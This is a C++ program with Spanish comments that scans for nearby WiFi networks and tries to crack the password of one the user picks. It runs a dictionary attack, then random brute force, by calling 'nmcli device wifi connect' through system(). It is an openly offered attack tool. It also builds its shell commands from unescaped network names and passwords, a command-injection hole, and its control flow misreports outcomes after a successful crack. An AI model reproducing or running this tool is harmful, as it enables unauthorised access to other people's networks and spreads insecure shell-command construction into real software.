#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <cstdlib>
#include <random>
#include <ctime>
#include <vector>

using namespace std;

string nombreRed;
string contrasena;
int resultado = 0;

string letras = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
string numeros = "0123456789";
string caracteresEspeciales = "!@#$%^&*()_-+=[]{}|;:,.<>?";
int cantidadPalabras = 0;

// Función para listar las redes WiFi disponibles
vector<string> listarRedesWiFi() {
    vector<string> redesWiFi;
    string comando = "nmcli -t -f SSID device wifi list";
    FILE* archivo = popen(comando.c_str(), "r");

    if (archivo) {
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), archivo) != nullptr) {
            string red = buffer;
            size_t len = red.find_last_not_of("\r\n");
            if (len != string::npos) {
                red.erase(len + 1);
            }
            redesWiFi.push_back(red);
        }
        pclose(archivo);
    }

    return redesWiFi;
}

int main() {

    vector<string> redesDisponibles = listarRedesWiFi();

    if (redesDisponibles.empty()) {
        cout << "No se encontraron redes WiFi disponibles." << endl;
        return 1;
    }

    cout << "Redes WiFi disponibles:" << endl;
    for (size_t i = 0; i < redesDisponibles.size(); ++i) {
        cout << i + 1 << ". " << redesDisponibles[i] << endl;
    }

    cout << "Por favor, elija el numero de contraseñas que quiere probar despues de haber completado el diccionario o elija 0 para ejecutarlo infinitamente (No recomendado)" << endl;
    cin >> cantidadPalabras;

    string caracteresTotales = letras + numeros + caracteresEspeciales;

    int seleccion;
    cout << "Seleccione una red WiFi (ingrese el número): ";
    cin >> seleccion;

    // Solicitamos la entrada del nombre de la red
    // cout << "Ingresa el nombre de la red wifi" << endl;
    // cin >> nombreRed;

    if (!(seleccion >= 1 && seleccion <= static_cast<int>(redesDisponibles.size()))) {
        cout << "Selección no válida." << endl;
        return 1;
    }
    nombreRed = redesDisponibles[seleccion - 1];

    // Abrimos el archivo de diccionario
    ifstream archivo("dictionary.txt");

    // Verificamos si el archivo se ha abierto correctamente
    if (!archivo.is_open()) {
        cerr << "No se puedo abrir el archivo." << endl;
        return 1;
    }

    mt19937 rng(time(0));
    uniform_int_distribution<int> distribucion(1, 32);

    // Lee el archivo linea por linea
    while (getline(archivo, contrasena)) {
        // Metemos el comando en una variable
        string comando = "nmcli device wifi connect '" + nombreRed + "' password '" + contrasena + "'";

        // Ejecutamos el comando
        int resultado = system(comando.c_str());

        cout << "Checking Password: " << contrasena << endl;

        if (resultado == 0) {
            cout << "Successful WiFi connection." << endl;
            cout << "The cracked password is: " << contrasena << endl;
            break;
        } else {
            cerr << "Failed!" << endl;
        }
    }

    cout << "None of the dictionary passwords are correct, proceeding to BruteForce" << endl;

    // Cerramos archivo al finalizar el programa
    archivo.close();

    if (cantidadPalabras == 0) {
        // Bucle infinito si cantidadPalabras es 0
        while (true) {
            // Genera una palabra aleatoria de longitud aleatoria
            int longitud = distribucion(rng);
            string palabraAleatoria;

            for (int j = 0; j < longitud; ++j) {
                char caracterAleatorio = caracteresTotales[rng() % caracteresTotales.size()];
                palabraAleatoria += caracterAleatorio;
            }

            cout << "Checking Password: " << palabraAleatoria << endl;

            string comando = "nmcli device wifi connect '" + nombreRed + "' password '" + palabraAleatoria + "'";
            resultado = system(comando.c_str());

            if (resultado == 0) {
                cout << "Successful WiFi connection." << endl;
                cout << "The cracked password is: " << palabraAleatoria << endl;
                break; // Sale del bucle si la conexión es exitosa
            } else {
                cerr << "Failed!" << endl;
            }
        }
    } else {
        for (int i = 0; i < cantidadPalabras; i++) {
            // Genera una palabra aleatoria de longitud aleatoria
            int longitud = distribucion(rng);
            string palabraAleatoria;

            for (int j = 0; j < longitud; ++j) {
                char caracterAleatorio = caracteresTotales[rng() % caracteresTotales.size()];
                palabraAleatoria += caracterAleatorio;
            }

            cout << "Checking Password: " << palabraAleatoria << endl;

            string comando = "nmcli device wifi connect '" + nombreRed + "' password '" + palabraAleatoria + "'";
            resultado = system(comando.c_str());

            if (resultado == 0) {
                cout << "Successful WiFi connection." << endl;
                cout << "The cracked password is: " << palabraAleatoria << endl;
            } else {
                cerr << "Failed!" << endl;
            }
        }
    }

    return 0;
}